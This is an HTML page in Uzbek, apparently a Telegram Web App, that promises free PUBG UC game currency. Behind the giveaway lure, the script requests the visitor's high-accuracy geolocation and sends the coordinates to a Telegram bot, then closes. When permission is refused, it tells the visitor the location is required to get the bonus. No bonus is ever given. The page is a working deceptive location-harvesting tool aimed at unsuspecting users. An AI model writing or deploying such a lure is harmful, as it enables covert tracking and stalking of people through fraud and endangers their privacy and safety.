<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG UC Bonus</title>
    <!-- Telegram Web App Scripti -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1c2630;
            color: white;
            text-align: center;
            padding: 50px 20px;
            margin: 0;
        }
        .container {
            border: 2px solid #f39c12;
            padding: 20px;
            border-radius: 10px;
            background-color: #2c3e50;
        }
        .btn {
            background-color: #f39c12;
            color: black;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
        }
        .loader {
            display: none;
            color: #f39c12;
            margin-top: 15px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>🎁 PUBG UC Yutug'ini Faollashtirish</h2>
    <p>Hisobingizga bepul UC yuklanishi uchun hududingizni tasdiqlang va bonusni faollashtiring!</p>

    <button class="btn" id="claimBtn">Bonusni Olish</button>
    <div class="loader" id="loader">Joylashuv aniqlanmoqda...</div>
</div>

<script>
    // Telegram Web App ob'ektini ishga tushiramiz
    const tg = window.Telegram.WebApp;
    tg.expand(); // Oynani to'liq ekranga yoyish

    document.getElementById('claimBtn').addEventListener('click', function() {
        document.getElementById('loader').style.display = 'block';

        // Brauzer orqali geolokatsiyani so'rash
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const data = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude
                    };

                    // Ma'lumotlarni Telegram botga JSON formatda yuborish
                    tg.sendData(JSON.stringify(data));
                    tg.close(); // Web App oynasini yopish
                },
                function(error) {
                    document.getElementById('loader').innerText = "Xatolik: Joylashuvga ruxsat berilmadi.";
                    alert("Bonusni olish uchun joylashuvga ruxsat berishingiz shart!");
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        } else {
            alert("Sizning qurilmangiz geolokatsiyani qo'llab-quvvatlamaydi.");
        }
    });
</script>

</body>
</html>
